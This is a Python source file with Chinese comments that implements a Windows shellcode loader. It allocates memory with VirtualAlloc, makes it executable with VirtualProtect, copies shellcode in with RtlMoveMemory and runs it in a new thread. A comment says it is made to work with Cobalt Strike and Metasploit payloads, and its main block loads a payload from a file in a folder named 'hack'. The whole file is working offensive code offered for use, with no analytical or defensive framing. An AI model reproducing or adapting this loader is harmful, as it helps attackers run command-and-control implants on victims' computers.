import ctypes
import sys

info='使用VirtualAlloc动态申请读写权限的内存 -> VirtualProtect修改内存的权限为读写执行 -> RtlMoveMemory将shellcode拷贝入申请空间-》CreateThread创建线程运行'

def main(buf):
    if isinstance(buf,str):
        buf=buf.encode('latin1')    #确保buf是unicode，此处是为了兼容CS和MSF

    shellcode=bytearray(buf)

    #定义返回类型
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

    #VirtualAlloc申请一块内存空间，只是普通的读写权限
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_int(len(shellcode)),
        ctypes.c_int(0x3000),
        ctypes.c_int(0x04), #这个地方的权限不同
    )

    buffer = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.VirtualProtect(
        ctypes.c_uint64(ptr),
        ctypes.c_int(len(shellcode)),
        0x40,
        ctypes.pointer(ctypes.c_int(1))
    )
    #把shellcode写入内存
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_uint64(ptr),
        buffer,
        ctypes.c_int(len(shellcode))
    )

    #创建线程执行shellcode
    handle = ctypes.windll.kernel32.CreateThread(
        ctypes.pointer(ctypes.c_int(0)),
        ctypes.c_int(0),
        ctypes.c_void_p(ptr),
        ctypes.pointer(ctypes.c_int(0)),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0))
    )
    #等待执行
    ctypes.windll.kernel32.WaitForSingleObject(
        ctypes.c_int(handle),
        ctypes.c_int(-1)
    )

if __name__ == '__main__':
    import shellcoder
    buf=shellcoder.main('','',r"C:\Users\d\Desktop\hack\payloadJQuery.py",'','',True)
    print('buf:\n',buf)

    if not buf:
        sys.exit()
    else:

        main(buf)